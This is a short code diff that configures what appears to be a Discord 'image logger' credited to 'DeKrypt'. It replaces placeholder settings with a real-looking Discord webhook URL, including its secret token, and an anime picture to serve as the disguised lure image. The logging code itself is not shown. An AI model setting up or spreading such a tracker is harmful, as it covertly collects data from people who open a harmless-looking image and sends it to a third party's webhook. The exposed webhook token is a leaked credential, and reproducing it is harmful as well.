@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336223993513902091/QbF484EIKIPSTvaMZHx_JBgFhtBV20rB-_v3gx17IFwep1daUFgz9aTcUX2MCvjn29aJ",
+    "image": "https://static1.cbrimages.com/wordpress/wp-content/uploads/2020/03/Love-Detective-Chika-Fujiwara-from-Kaguya-sama-Cropped.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
